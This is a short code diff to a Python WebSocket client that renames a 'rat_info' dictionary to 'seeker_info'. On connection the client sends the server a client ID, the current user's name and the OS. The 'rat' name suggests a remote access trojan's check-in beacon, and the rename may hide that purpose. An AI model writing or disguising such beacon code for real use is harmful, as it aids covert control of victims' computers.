@@ -112,7 +112,7 @@ def on_open(ws):
     seconds_disconnected = 0
     print("[WebSocket] Connected.")
 
-    rat_info = {
+    seeker_info = {
         "id": client_uuid,
         "name": util.get_current_user(),
         "os": "Windows",
@@ -120,7 +120,7 @@ def on_open(ws):
         "metadata": {"version": "1.0"}
     }
 
-    ws.send(json.dumps(rat_info))
+    ws.send(json.dumps(seeker_info))
 
 
 def run_websocket():
